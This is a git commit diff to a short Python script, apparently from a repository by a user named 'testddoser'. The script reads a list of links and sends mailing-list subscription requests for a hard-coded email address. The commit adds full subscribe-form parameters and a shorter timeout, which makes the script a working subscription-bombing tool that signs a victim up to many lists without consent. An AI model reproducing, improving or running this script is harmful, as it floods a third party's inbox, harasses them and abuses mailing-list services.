2879a2adbab1e38020752dff9bf82080384ffe86
testddoser <129606911+testddoser@users.noreply.github.com>
2024-04-04 18:20:10 +0300

    Update main.py

--- main.py
+++ main.py
@@ -4,15 +4,15 @@ from urllib.request import urlopen
 # Запрашиваем у пользователя почту
 #email = input("Введите вашу электронную почту: ")
 
-email = "8k10beh38h@waterisgone.com"
+email = "dlxvhymjdss@wireconnected.com"
 #Открываем файл с ссылками
 with open('links.txt', 'r') as f:
     # Читаем все ссылки из файла
     for i, link in enumerate(f):
         # Удаляем символ новой строки
-        link = link.strip() + email
+        link = link.strip() + email + "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
         try:
-        	response = requests.get(link, timeout=7)
+        	response = requests.get(link, timeout=1)
         	print(f"Отправил {i+1} запрос")
         except:
         	print("Error")
